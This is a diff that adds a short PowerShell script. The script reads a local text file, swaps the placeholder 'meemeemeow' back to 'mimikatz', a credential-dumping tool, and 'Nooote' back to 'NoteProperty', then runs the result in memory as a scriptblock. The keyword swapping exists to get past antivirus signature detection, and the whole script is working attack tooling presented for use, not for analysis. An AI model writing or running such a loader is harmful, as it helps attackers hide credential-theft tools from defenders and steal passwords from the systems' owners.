@@ -1,0 +1,9 @@
+﻿# Manually loads code into memory, compatible with older systems/ps3
+# Copy/paste into ps to load code, invoke after code loaded
+
+$strCPath = (get-location).path + "\clist-4a.txt"
+$strCode = [io.file]::ReadAllText($strCPath)
+$strCode = $strCode -replace "Nooote", "NoteProperty"
+$strCode = $strCode -replace "meemeemeow", "mimikatz"
+$strCode = [scriptblock]::Create($strCode)
+.$strCode
